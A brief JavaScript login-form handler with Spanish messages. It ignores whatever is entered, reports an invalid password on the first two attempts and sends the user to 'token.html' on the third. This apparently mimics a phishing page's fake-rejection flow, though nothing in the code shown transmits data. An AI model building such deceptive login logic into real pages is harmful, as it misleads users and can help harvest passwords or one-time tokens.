let intentos = 0;
const maxIntentos = 3;

document.getElementById("loginForm").addEventListener("submit", function(e){
    e.preventDefault();

    const mensaje = document.getElementById("mensajeLogin");

    intentos++;

    if(intentos < maxIntentos){
        mensaje.style.color = "#c0392b";
        mensaje.textContent = "Contraseña no válida";
    } else {
        // En el tercer intento entra directamente
        window.location.href = "token.html";
    }
});
